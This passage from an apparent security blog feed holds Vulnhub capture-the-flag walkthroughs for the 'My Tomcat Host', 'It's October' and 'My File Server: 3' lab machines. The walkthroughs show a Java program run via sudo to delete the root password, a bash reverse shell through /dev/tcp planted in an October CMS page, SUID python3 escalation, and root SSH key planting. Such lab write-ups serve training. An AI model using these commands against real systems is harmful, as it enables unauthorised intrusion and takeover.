+<p>Firstly I converted the shell into the interactive shell and I checked them for permissions on sudo command :</p>
+<pre class="toolbar:2 toolbar-hide:false striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-4.2$ id
+	uid=998(tomcat) gid=997(tomcat) groups=997(tomcat)
+	sh-4.2$ sudo -l
+	Matching Defaults entries for tomcat on this host:
+	    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
+	    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
+	    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+	    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
+	    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
+	    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+	    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+	User tomcat may run the following commands on this host:
+	    (ALL) NOPASSWD:
+	    /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.242.b08-0.el7_7.x86_64/jre/bin/java</pre>
+<p>I see that we can run <strong>java</strong> command with <strong>sudo</strong> privileges. You can find the program from any place, I got it on stack overflow.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">import java.io.BufferedReader;
+	import java.io.InputStreamReader;
+
+	public class armour {  //you have to change thew class same as file name
+	    public static void main(String args[]) {
+	        String s;
+	        Process p;
+	        try {
+	            p = Runtime.getRuntime().exec("passwd -d root");  //the command you want to execute
+	            BufferedReader br = new BufferedReader(
+	                new InputStreamReader(p.getInputStream()));
+	            while ((s = br.readLine()) != null)
+	                System.out.println("line: " + s);
+	            p.waitFor();
+	            System.out.println ("exit: " + p.exitValue());
+	            p.destroy();
+	        } catch (Exception e) {}
+	    }
+	}</pre>
+<p>now I compile the code and executed it.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">bash-4.2$ javac armour.java
+	bash-4.2$ sudo java armour
+	line: Removing password for user root.
+	line: passwd: Success
+	exit: 0
+	bash-4.2$ su root
+	[root@my_tomcat tmp]# id 
+	uid=0(root) gid=0(root) groups=0(root)
+	[root@my_tomcat tmp]# hostname 
+	my_tomcat
+	[root@my_tomcat tmp]# whoami 
+	root
+	[root@my_tomcat tmp]# uname -a
+	Linux my_tomcat 3.10.0-1062.18.1.el7.x86_64 #1 SMP Tue Mar 17 23:49:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+	[root@my_tomcat tmp]# cd /root/
+	[root@my_tomcat ~]# ls
+	proof.txt
+	[root@my_tomcat ~]# cat proof.txt 
+	Best of Luck
+	628435356e49f976bab2c04948d22fe4
+	[root@my_tomcat ~]#</pre>
+<p>Boom !!! Eureka !!! I Got root &#8230;&#8230; and here is the flag.</p>
+<p>&nbsp;</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-tomcat-host-walkthrough/">My Tomcat Host Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/my-tomcat-host-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>It&#8217;s October Vulnhub Walkthrough</title>
+		<link>https://www.armourinfosec.com/its-october-vulnhub-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/its-october-vulnhub-walkthrough/#comments</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Tue, 07 Apr 2020 11:27:53 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[It's October Walkthrough]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25948</guid>
+
+					<description><![CDATA[<p>Here&#8217;s the new challenge of &#8220;It&#8217;s October Vulnhub Walkthrough&#8221;.  It&#8217;s October is an easy box for the beginner and wannabe...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/its-october-vulnhub-walkthrough/">It&#8217;s October Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Here&#8217;s the new challenge of <a href="https://www.infosecwarrior.com/its-october/"><strong>&#8220;It&#8217;s October Vulnhub Walkthrough&#8221;</strong></a>.  It&#8217;s October is an easy box for the beginner and wannabe hackers. It is a box learning about October CMS and enumeration. The box was designed by<a href="https://twitter.com/akankshavermasv"> Akansha Verma</a>. This machine got something unique as it teaches you how you can exploit a cms even if you can&#8217;t find any known vulnerability.</p>
+<h3><img decoding="async" class="alignnone wp-image-25949 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313.png" alt="It's October Vulnhub Walkthrough" width="798" height="317" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313.png 798w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313-300x119.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-18-53-47-e1586457011313-768x305.png 768w" sizes="(max-width: 798px) 100vw, 798px" /></h3>
+<h3>Pentester Methodology</h3>
+<h5>Network Scanning</h5>
+<ul>
+<li>nmap</li>
+<li>netdiscover</li>
+</ul>
+<h5>Enumeration</h5>
+<ul>
+<li>nikto</li>
+<li>gobuster</li>
+<li>placing of reverse shell</li>
+</ul>
+<h5>Privilege Escalation</h5>
+<ul>
+<li>abusing SETUID</li>
+</ul>
+<h3>Network Discovery</h3>
+<p>In order to get the IP of the machine I used, netdiscover. As I allotted host-only adapter to my machine.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+
+Currently scanning: 192.168.157.0/16   |   Screen View: Unique Hosts                                                                                        
+4 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 222               
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.2.2     08:00:27:ac:26:45      1      42  PCS Systemtechnik GmbH      
+192.168.2.12    08:00:27:cb:f2:fb      3     180  PCS Systemtechnik GmbH</pre>
+<p>And got my IP : <strong>192.168.2.12.</strong> Now lets begin with nmap scan.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -A -O -sS -sC -p- 192.168.2.12
+
+Starting Nmap 7.80 ( https://nmap.org/ ) at 2020-04-06 18:59 IST
+Nmap scan report for 192.168.2.12
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
+|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Homepage | My new websites
+3306/tcp open  mysql   MySQL (unauthorized)
+8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: My Note
+MAC Address: 08:00:27:CB:F2:FB (Oracle VirtualBox virtual NIC)
+</pre>
+<p>I saw that ports <strong>80</strong> and <strong>8080</strong> are open, so without any delay, I visited the page.</p>
+<p><img decoding="async" class="alignnone wp-image-25950 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-1024x576.png" alt="It's October Vulnhub Walkthrough" width="1024" height="576" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-1024x576.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-300x169.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19-768x432.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-19.png 1366w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>It&#8217;s just a normal website. I don&#8217;t get anything useful in page source. But still moving forward.</p>
+<p><img decoding="async" class="alignnone wp-image-25951 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-1024x576.png" alt="" width="1024" height="576" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-1024x576.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-300x169.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47-768x432.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-02-47.png 1366w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>This is also a simple web page. But it consists a clue in the <strong>page source</strong> to visit <strong>192.168.2.12/mynote.txt</strong></p>
+<p><img decoding="async" class="alignnone wp-image-25952" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-06-02.png" alt="" width="400" height="99" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-06-02.png 374w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-06-02-300x75.png 300w" sizes="(max-width: 400px) 100vw, 400px" /></p>
+<p>We got credentials for cms <strong>admin:adminadmin2. </strong>I used <strong>nikto</strong> for further enumeration but nothing much.</p>
+<p>So I tried directory brute-forcing. I used <strong>gobuster</strong> and found a directory /<strong>backend </strong>showing the code 302.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://192.168.2.12/
+
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://192.168.2.12/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/04/06 19:14:00 Starting gobuster
+===============================================================
+/themes (Status: 301)
+/modules (Status: 301)
+/0 (Status: 200)
+/storage (Status: 301)
+/plugins (Status: 301)
+/backend (Status: 302)
+/vendor (Status: 301)
+/config (Status: 301)
+Progress: 13383 / 220561 (6.07%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/04/06 19:22:15 Finished
+===============================================================</pre>
+<p>Eureka. We got a CMS login page of OCTOBER CMS. I the old credential for the login.</p>
+<p><img decoding="async" class="alignnone wp-image-25953 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04.png" alt="" width="906" height="571" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04.png 906w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04-300x189.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-19-16-04-768x484.png 768w" sizes="(max-width: 906px) 100vw, 906px" /></p>
+<p>&nbsp;</p>
+<p>And we are in.. The first checkpoint arrived. Now we need to upload a reverse shell on the CMS in order to get a shell. So for that, we <strong>open cms tab </strong> on the <strong>Dashboard&gt; </strong>click on <strong>+ADD&gt;</strong>enter the details of the page along with the shell&gt;<strong>Save it.</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">function onstart(){
+     exec("/bin/bash -c 'bash -i &gt; /dev/tcp/192.168.2.1/1505 0&gt;&amp;1'");
+}</pre>
+<p><img decoding="async" class="alignnone wp-image-25954 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/12.png" alt="It's October Vulnhub Walkthrough" width="1365" height="735" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/12.png 1365w, https://www.armourinfosec.com/wp-content/uploads/2020/04/12-300x162.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/12-1024x551.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/12-768x414.png 768w" sizes="(max-width: 1365px) 100vw, 1365px" /></p>
+<p>&nbsp;</p>
+<p>Now start the listener on the local machine and call the web page on the web.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nc -nlvp 1505
+
+listening on [any] 1505 ...
+connect to [192.168.2.1] from (UNKNOWN) [192.168.2.12] 4038
+bash-5.0$ id
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+<h3>Privilege Escalation:</h3>
+<p>Now for the privilege, I got nothing but a local user named <strong>armour</strong>. Then we checked for suid:</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">bash-5.0$ find / -perm -u=s -type f 2&gt;/dev/null
+
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/python3
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/python3.7
+/usr/bin/gpasswd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper</pre>
+<p>&nbsp;</p>
+<p>So we got <strong>SUID</strong> bit configured on <strong>/bin/python3.</strong> We can approach for the root using this.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">bash-5.0$ cd /tmp/
+bash-5.0$ vim armour.py 
+
+ #!/usr/bin/python
+ import os
+ os.execl("/bin/bash","sh","-p")
+ ~                                                                               
+ ~                                                                               
+ ~                                                                               
+ ~                                                                               
+ :wq!
+                                                                                                
+bash-5.0$ chmod 777 armour.py 
+bash-5.0$ python3 armour.py 
+
+sh-5.0# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+sh-5.0# cd /root/
+sh-5.0# ls
+proof.txt
+sh-5.0# cat proof.txt 
+Best of Luck
+$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq
+</pre>
+<p>BOOM! we have the flag and euid of root!!. But we need to get the proper shell so I transfer the authorized_keys to the machine and called for ssh connection.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">sh-5.0# cd /root/.ssh
+sh-5.0# wget http://192.168.2.1:8080/authorized_keys 
+--2020-04-06 10:23:55--  http://192.168.2.1:8080/authorized_keys
+Connecting to 192.168.2.1:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 569 [application/octet-stream]
+Saving to: ‘authorized_keys’
+
+authorized_keys     100%[===================&gt;]     569  --.-KB/s    in 0s      
+
+2020-04-06 10:23:55 (41.3 MB/s) - ‘authorized_keys’ saved [569/569]
+
+sh-5.0# ls 
+authorized_keys
+
+#ssh 192.168.2.12
+The authenticity of host '192.168.2.12 (192.168.2.12)' can't be established.
+ECDSA key fingerprint is SHA256:DYZkjGYMu99f1Ml7F6XHJ+4Oh/GISu41/GP0Y+yMgpg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.12' (ECDSA) to the list of known hosts.
+   ##############################################################################################
+   #                                      Armour Infosec                                        #
+   #                         --------- www.armourinfosec.com ------------                       #
+   #                                    It's October	                                        #
+   #                               Designed By  :- Akanksha Sachin Verma                        #
+   #                               Twitter      :- @akankshavermasv                             #
+   ##############################################################################################                                       IP:\4
+                                       Hostname: \n
+Debian GNU/Linux 10
+Linux october 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Mar 27 10:53:25 2020 from 192.168.1.6
+
+root@october:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@october:~# hostname
+october
+root@october:~# uname -a
+Linux october 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux
+root@october:~# cd 
+root@october:~# cat proof.txt 
+Best of Luck
+$2y$12$EUztpmoFH8LjEzUBVyNKw.9AKf37uZWPxJp.A3eop2ff0LbLYZrFq
+</pre>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/its-october-vulnhub-walkthrough/">It&#8217;s October Vulnhub Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://www.armourinfosec.com/its-october-vulnhub-walkthrough/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>My File Server: 3 Walkthrough</title>
+		<link>https://www.armourinfosec.com/my-file-server-3-walkthrough/</link>
+					<comments>https://www.armourinfosec.com/my-file-server-3-walkthrough/#respond</comments>
+		
+		<dc:creator><![CDATA[Armour Infosec]]></dc:creator>
+		<pubDate>Mon, 06 Apr 2020 05:36:39 +0000</pubDate>
+				<category><![CDATA[Walkthrough]]></category>
+		<category><![CDATA[infosec warrior]]></category>
+		<category><![CDATA[My File Server: 3 Walkthrough]]></category>
+		<category><![CDATA[vulnhub]]></category>
+		<guid isPermaLink="false">https://www.armourinfosec.com/?p=25860</guid>
+
+					<description><![CDATA[<p>I will share with you a new Walkthrough for Infosec Warriors CTF machines. My File Server: 3 Walkthrough for the...</p>
+<p>The post <a rel="nofollow" href="https://www.armourinfosec.com/my-file-server-3-walkthrough/">My File Server: 3 Walkthrough</a> appeared first on <a rel="nofollow" href="https://www.armourinfosec.com/">Armour Infosec</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>I will share with you a new Walkthrough for <a href="http://www.infosecwarrior.com/"><strong>Infosec Warriors CTF</strong></a> machines. <strong>My File Server: 3 Walkthrough</strong> for the CTF machine is created by Vishal Biswas AKA Cyberknight. You can download here this <a href="https://www.infosecwarrior.com/my-file-server-3/">CTF</a>. It states the level is Intermediate level and that is true. Either way, you explore a little if this is unfamiliar and that&#8217;s how you learn.</p>
+<p><img decoding="async" class="alignnone wp-image-25882 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517.png" alt="My File Server: 3 Walkthrough" width="800" height="302" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517.png 800w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517-300x113.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-41-05-e1586276183517-768x290.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></p>
+<h2>Penetration Testing Methodologies</h2>
+<h4>Network Scan</h4>
+<ul>
+<li> Netdicover</li>
+<li> Nmap Enumeration</li>
+</ul>
+<h4>Enumeration</h4>
+<ul>
+<li> Nikto</li>
+<li>Nmap Scripts</li>
+<li> Injecting authorized_keys via smb</li>
+<li> ProFTPd 1.3.5  File Copy</li>
+</ul>
+<h4>Privilege Escalation</h4>
+<ul>
+<li>Buffer overflow</li>
+<li>Capture the Flag.</li>
+<li>password</li>
+<li>sudo</li>
+</ul>
+<h3>Network Scanning</h3>
+<p>So, as we always start with <strong>netdiscover</strong> to get the IP of the VM machine and the IP of the host found is 192.168.2.11</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#netdiscover -i vboxnet0
+
+ Currently scanning: 192.168.60.0/16 | Screen View: Unique Hosts
+
+ 2 Captured ARP Req/Rep packets, from 2 hosts. Total size: 102
+ _____________________________________________________________________________
+ IP At         MAC Address       Count  Len MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 192.168.2.2   08:00:27:25:0f:48  1      42 PCS Systemtechnik GmbH
+ 192.168.2.11  08:00:27:a8:98:39  1      60 PCS Systemtechnik GmbH
+</pre>
+<p class="">Let&#8217;s proceed with a network scan using Nmap aggressive scan as given below.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p- -A -sC -O 192.168.2.11
+
+ Nmap scan report for 192.168.2.11
+ Not shown: 65523 closed ports
+ PORT STATE SERVICE VERSION
+ 21/tcp open ftp vsftpd 3.0.2
+ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ |_drwxrwxrwx 3 0 0 16 Feb 19 07:48 pub [NSE: writeable]
+ | ftp-syst:
+ | vsFTPd 3.0.2 - secure, fast, stable
+ 22/tcp open ssh OpenSSH 7.4 (protocol 2.0)
+ | ssh-hostkey:
+ | 2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)
+ 80/tcp open http Apache httpd 2.4.6 ((CentOS))
+ | http-methods:
+ |_http-server-header: Apache/2.4.6 (CentOS)
+ |_http-title: My File Server
+ 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+ 445/tcp open netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
+ 1337/tcp open waste?
+ | fingerprint-strings:
+ | GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, TerminalServerCookie:
+ |_ Why are you here ?!
+ 2049/tcp open nfs_acl 3 (RPC #100227)
+ 2121/tcp open ftp ProFTPD 1.3.5
+ | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+ |_drwxrwxrwx 3 root root 16 Feb 19 07:48 pub [NSE: writeable]
+ 20048/tcp open mountd 1-3 (RPC #100005)
+ 35756/tcp open nlockmgr 1-4 (RPC #100021)
+ 35992/tcp open status 1 (RPC #100024)
+ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+ Device type: general purpose
+ Running: Linux 3.X
+ OS CPE: cpe:/o:linux:linux_kernel:3
+ OS details: Linux 3.4 - 3.10
+ Network Distance: 1 hop
+ Service Info: Host: FILESERVER; OS: Unix
+ OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</pre>
+<h3>Enumeration</h3>
+<p>It was very interesting. I noticed many ports were open and have <strong>Anonymous Login enabled. </strong>So I decided to enumerate more with Nmap scripts. Along with port number 80.</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#nmap -p 139,445 --script=smb-enum* 192.168.2.11
+
+ Nmap scan report for 192.168.2.11
+ PORT STATE SERVICE
+ 139/tcp open netbios-ssn
+ 445/tcp open microsoft-ds
+ MAC Address: 08:00:27:A8:98:39 (Oracle VirtualBox virtual NIC)
+ Host script results:
+ | smb-enum-shares:
+ | account_used: &lt;blank&gt;
+ | \\192.168.2.11\IPC$:
+ | Type: STYPE_IPC_HIDDEN
+ | Comment: IPC Service (Samba 4.9.1)
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\tmp
+ | Anonymous access: READ/WRITE
+ | \\192.168.2.11\print$:
+ | Type: STYPE_DISKTREE
+ | Comment: Printer Drivers
+ | Users: 0
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\var\lib\samba\drivers
+ | Anonymous access: &lt;none&gt;
+ | \\192.168.2.11\smbdata:
+ | Type: STYPE_DISKTREE
+ | Comment: smbdata
+ | Users: 0
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\smbdata
+ | Anonymous access: READ/WRITE
+ | \\192.168.2.11\smbuser:
+ | Type: STYPE_DISKTREE
+ | Comment: smbuser
+ | Users: 0
+ | Max Users: &lt;unlimited&gt;
+ | Path: C:\home\smbuser\
+ |_ Anonymous access: &lt;none&gt;
+ Nmap done: 1 IP address (1 host up) scanned in 300.66 seconds</pre>
+<p>We know that there might be a &#8220;smbuser&#8221; on the network.</p>
+<p><img decoding="async" class="alignnone wp-image-25886 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-00-59-28.png" alt="My File Server: 3 Walkthrough" width="292" height="196" /></p>
+<p>I choose to run Nikto for HTTP weak config listing, and found an entry for<strong> .ssh</strong></p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true ">#nikto -h http://192.168.2.11/
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP: 192.168.2.11
++ Target Hostname: 192.168.2.11
++ Target Port: 80
++ Start Time: 2020-04-06 01:01:31 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.6 (CentOS)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site differently to the MIME type
++ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD, TRACE
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3093: /.ssh/authorized_keys: A user's home directory may be set to the web root, an ssh file was retrieved. This should not be accessible via the web.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.</pre>
+<p>When I tested &#8220;.ssh&#8221; on web browser&#8230;.. I got ssh folder, containing id_rsa and authorized_keys.</p>
+<p><img decoding="async" class="alignnone wp-image-25880 size-full" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-42-1.png" alt="My File Server: 3 Walkthrough" width="474" height="296" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-42-1.png 474w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-42-1-300x187.png 300w" sizes="(max-width: 474px) 100vw, 474px" /></p>
+<p>When I opened authorized_keys. Its confirm that &#8220;smbuser&#8221; is present in host machine or network.</p>
+<p><img decoding="async" class="alignnone wp-image-25881 size-large" src="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-1024x130.png" alt="My File Server: 3 Walkthrough" width="1024" height="130" srcset="https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-1024x130.png 1024w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-300x38.png 300w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50-768x97.png 768w, https://www.armourinfosec.com/wp-content/uploads/2020/04/Screenshot-from-2020-04-06-01-02-50.png 1170w" sizes="(max-width: 1024px) 100vw, 1024px" /></p>
+<p>&nbsp;</p>
+<p>I download file authorized_keys in my local Linux</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#wget http://192.168.2.11/.ssh/authorized_keys
+
+ --2020-04-06 01:05:15--  http://192.168.2.11/.ssh/authorized_keys
+ Connecting to 192.168.2.11:80... connected.
+ HTTP request sent, awaiting response... 200 OK
+ Length: 410
+ Saving to: ‘authorized_keys’ 
+ authorized_keys         100%[==============================&gt;]     410  --.-KB/s    in 0s      
+ 2020-04-06 01:05:15 (39.3 MB/s) - ‘authorized_keys’ saved [410/410]</pre>
+<p>We know that &#8220;smbdata&#8221; has <strong>read and write</strong> permission. So if we place the authorized_keys of our Linux and&#8230;&#8230;&#8230;&#8230;&#8230;&#8230;</p>
+<pre class="toolbar:2 striped:false nums:false nums-toggle:false show-plain:3 lang:default highlight:0 decode:true">#smbclient //192.168.2.11/smbdata
+
+ Enter WORKGROUP\root's password: 
+ Anonymous login successful
+ Try "help" to get a list of possible commands.
+ smb: \&gt; ls
+  .                                   D        0  Mon Apr  6 00:56:56 2020
+  ..                                  D        0  Tue Feb 18 17:17:54 2020
+  anaconda                            D        0  Tue Feb 18 17:18:15 2020
+  audit                               D        0  Tue Feb 18 17:18:15 2020
+  boot.log                            N     6120  Tue Feb 18 17:18:16 2020
+  btmp                                N      384  Tue Feb 18 17:18:16 2020
+  cron                                N     4813  Tue Feb 18 17:18:16 2020
+  dmesg                               N    31389  Tue Feb 18 17:18:16 2020
+  dmesg.old                           N    31389  Tue Feb 18 17:18:16 2020
+  glusterfs                           D        0  Tue Feb 18 17:18:16 2020
+  lastlog                             N   292292  Tue Feb 18 17:18:16 2020
+  maillog                             N     1982  Tue Feb 18 17:18:16 2020
+  messages                            N   684379  Tue Feb 18 17:18:17 2020
+  ppp                                 D        0  Tue Feb 18 17:18:17 2020
+  samba                               D        0  Tue Feb 18 17:18:17 2020
